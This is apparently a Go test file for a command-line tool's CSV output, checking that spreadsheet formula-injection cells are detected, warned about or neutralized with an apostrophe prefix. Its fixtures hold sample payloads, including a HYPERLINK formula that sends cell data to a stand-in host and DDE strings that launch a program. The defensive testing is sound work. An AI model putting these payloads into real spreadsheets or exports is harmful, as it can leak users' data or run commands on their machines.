package output

import (
	"bytes"
	"io"
	"reflect"
	"testing"
)

func TestIsFormulaCell(t *testing.T) {
	tests := []struct {
		cell string
		want bool
	}{
		{"", false},
		{"Crash on save", false},
		{"a=b", false},
		{"=HYPERLINK(\"https://evil.example/?\"&A1,\"Click\")", true},
		{"=cmd|' /C calc'!A0", true},
		{"+1+cmd|' /C calc'!A0", true},
		{"-2+3+cmd|' /C calc'!A0", true},
		{"@SUM(1+1)*cmd|' /C calc'!A0", true},
		{"\t=1+1", true},
		{"\r=1+1", true},
		{"-", true},
		{"--help", true},
		{"-1", false},
		{"-1.5", false},
		{"+3", false},
		{"-.5", false},
		{"-1e3", false},
		{"-1.5h", true},
		{"-Inf", true},
		{"-0x10", true},
		{"42", false},
		{"2026-10-25", false},
	}
	for _, tt := range tests {
		if got := IsFormulaCell(tt.cell); got != tt.want {
			t.Errorf("IsFormulaCell(%q) = %v, want %v", tt.cell, got, tt.want)
		}
	}
}

func TestNeutralizeFormulaCells(t *testing.T) {
	rows := [][]string{
		{"1", "=1+1", "-1.5"},
		{"2", "@cmd", "plain"},
	}
	want := [][]string{
		{"1", "'=1+1", "-1.5"},
		{"2", "'@cmd", "plain"},
	}
	got := NeutralizeFormulaCells(rows)
	if !reflect.DeepEqual(got, want) {
		t.Errorf("NeutralizeFormulaCells = %q, want %q", got, want)
	}
	if rows[0][1] != "=1+1" {
		t.Errorf("input rows were modified: %q", rows)
	}
}

func TestPrinterCSV_FormulaGuard(t *testing.T) {
	headers := []string{"=ID", "SUBJECT", "HOURS"}
	evilRows := [][]string{{"1", "=HYPERLINK(\"http://evil.example\")", "-1.5"}}
	safeRows := [][]string{{"1", "Crash on save", "-1.5"}}

	tests := []struct {
		name       string
		neutralize bool
		rows       [][]string
		wantOut    string
		wantWarn   bool
	}{
		{
			name:     "default keeps output verbatim and warns",
			rows:     evilRows,
			wantOut:  "=ID,SUBJECT,HOURS\n1,\"=HYPERLINK(\"\"http://evil.example\"\")\",-1.5\n",
			wantWarn: true,
		},
		{
			name:       "strict neutralizes",
			neutralize: true,
			rows:       evilRows,
			wantOut:    "=ID,SUBJECT,HOURS\n1,\"'=HYPERLINK(\"\"http://evil.example\"\")\",-1.5\n",
		},
		{
			name:    "no formula cells, no warning",
			rows:    safeRows,
			wantOut: "=ID,SUBJECT,HOURS\n1,Crash on save,-1.5\n",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var out bytes.Buffer
			var warnings []string
			p := NewStdPrinter(&out, io.Discard, false, true, FormatCSV)
			p.SetCSVFormulaGuard(tt.neutralize, func(msg string) { warnings = append(warnings, msg) })
			p.CSV(headers, tt.rows)
			if out.String() != tt.wantOut {
				t.Errorf("CSV output = %q, want %q", out.String(), tt.wantOut)
			}
			if gotWarn := len(warnings) > 0; gotWarn != tt.wantWarn {
				t.Errorf("warned = %v (%q), want %v", gotWarn, warnings, tt.wantWarn)
			}
			if tt.wantWarn && warnings[0] != CSVFormulaWarning {
				t.Errorf("warning = %q, want %q", warnings[0], CSVFormulaWarning)
			}
		})
	}
}

func TestPrinterCSV_NotTerminalSanitized(t *testing.T) {
	var out bytes.Buffer
	p := NewStdPrinter(&out, io.Discard, false, true, FormatCSV)
	p.CSV([]string{"SUBJECT"}, [][]string{{"a\x1b[31mb"}})
	if want := "SUBJECT\na\x1b[31mb\n"; out.String() != want {
		t.Errorf("CSV output = %q, want %q", out.String(), want)
	}
}
